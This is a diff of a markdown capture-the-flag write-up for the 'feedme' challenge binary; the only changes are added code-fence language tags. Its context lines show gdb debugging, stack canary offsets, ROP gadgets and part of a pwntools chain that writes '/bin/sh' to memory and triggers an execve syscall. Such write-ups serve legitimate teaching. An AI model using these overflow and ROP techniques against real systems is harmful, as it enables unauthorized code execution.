@@ -4,7 +4,7 @@ This is based off of a Raytheon SI Govs talk.
 
 Let's take a look at the binary:
 
-```
+```console
 $    pwn checksec feedme
 [*] '/Hackery/pod/modules/bof_static/dcquals16_feedme/feedme'
     Arch:     i386-32-little
@@ -31,7 +31,7 @@ So we can see that we are dealing with a 32 bit statically linked binary, with a
 
 Looking for the references to the string `FEED ME!`, we find this:
 
-```
+```c
 uint feedMeFunc(void)
 
 {
@@ -60,7 +60,7 @@ So we can see it starts off by establishing the stack canary. Proceeding that we
 
 First we set gdb to follow the child process on forks, since that is where this code is ran. Also we set breakpoints for the functions `getInt`, `scanInMemory`, and `FUN_08048f6e`:
 
-```
+```gdb
 gef➤  set follow-fork-mode child
 gef➤  show follow-fork mode
 Debugger response to a program call of fork or vfork is "child".
@@ -219,7 +219,7 @@ $1 = 0x37
 
 For the `getInt` function, we see that we passed it the string `75395128`, and it returned to us `0x37` (which corresponds to the ascii character `7`):
 
-```
+```gdb
 gef➤  c
 Continuing.
 [ Legend: Modified register | Code | Heap | Stack | String ]
@@ -384,7 +384,7 @@ gef➤  x/40w 0xffffcfec
 
 We can see that the `scanInMemory` function took two arguments, which were the output of `getInt` and a stack pointer. It scanned in `size` amount of bytes into the pointer it was passed. Also even though the function was passed `0x37` as a size, I gave it `0x38` bytes worth of `0` (`0x30`) just to lend more evidence to how I thought this worked:
 
-```
+```gdb
 gef➤  s
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
@@ -694,7 +694,7 @@ ATE 30303030303030303030303030303030...
 
 So we can see that the last function returned a pointer which was `16` bytes of our input converted to ASCII, which was then printed. Let's see what the offset from our input to the stack canary and the return address:
 
-```
+```gdb
 gef➤  set follow-fork-mode child
 gef➤  b *0x8049069
 Breakpoint 1 at 0x8049069
@@ -780,7 +780,7 @@ Stack level 0, frame at 0xffffd020:
 
 We can see that our input is being scanned in starting at `0xffffcfec`. We can see that the return address is at `0xffffd01c`. We can also see that the stack canary is `0x6e6a7000` at `0xffffd00c` (we can tell this since stack canaries in `x86` are 4 byte random values, with the last value being a null byte). Doing a bit of python math we can find the offsets:
 
-```
+```pycon
 $    python
 Python 2.7.15+ (default, Nov 27 2018, 23:36:35)
 [GCC 7.3.0] on linux2
@@ -793,7 +793,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 So we can see that the offset to the stack canary is `0x20` bytes, and that the offset to the return address is `0x30` bytes. Both are well within the reach of our buffer overflow. Lastly let's see where the `feedMeFunc` function is called. We can see the backtrace using gdb:
 
-```
+```gdb
 gef➤  r
 Starting program: /Hackery/pod/modules/bof_static/dcquals16_feedme/feedme
 FEED ME!
@@ -853,7 +853,7 @@ gef➤  bt
 
 Going through the backtrace leads us to the following function:
 
-```
+```c
 void parentLoop(void)
 
 {
@@ -905,37 +905,37 @@ After that, we will have the stack canary and nothing will be able to stop us fr
 
 First we look for ROP gadgets using the tool ROPgadget (since this is a statically linked binary, there will be a lot of gadgets):
 
-```
+```console
 $    python ROPgadget.py --binary feedme
 ```
 
 Looking through the list of ROP gadgets, we see a few useful gadgets:
 
-```
+```nasm
 0x0807be31 : mov dword ptr [eax], edx ; ret
 ```
 
 This gadget is extremely useful. What this will allow us to do is move the contents of the edx register into the area of space pointed to by the address of eax, then return. So if we wanted to write to the address 1234, we could load that address into eax, and the value we wanted to write into the edx register, then call this gadget.
 
-```
+```nasm
 0x080bb496 : pop eax ; ret
 ```
 
 This gadget is helpful since it will allow us to pop a value off of the stack into the eax register to use, then return to allow us to continue the ROP Chain.
 
-```
+```nasm
 0x0806f34a : pop edx ; ret
 ```
 
 This gadget is similar to the previous one, except it is with the edx register instead of the eax register.
 
-```
+```nasm
 0x0806f371 : pop ecx ; pop ebx ; ret
 ```
 
 This gadget is so we can control the value of the ecx register. Unfortunately there are no gadgets that will just pop a value into the ecx register then return, so this is the next best thing (using this gadget will save us not having to use another gadget when we pop a value into the ebx register however).
 
-```
+```nasm
 0x08049761 : int 0x80
 ```
 
@@ -945,7 +945,7 @@ Now we are going to have to write the string /bin/sh somewhere in memory, at an 
 
 With that, we get the following ROP Chain:
 
-```
+```python
 # This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
 payload += p32(0x080bb496)    # pop eax ; ret
 payload += p32(0x80eb928)    # bss address
@@ -974,7 +974,7 @@ payload += p32(0x8049761)    # syscall
 ## Exploit
 
 Putting it all together, we get the following exploit:
-```
+```python
 # This is based off of a Raytheon SI Govs talk
 
 # First we import pwntools
@@ -1074,7 +1074,7 @@ target.interactive()
 
 When we run the exploit:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './feedme': pid 16881
 [*] Trying canary: 0x000
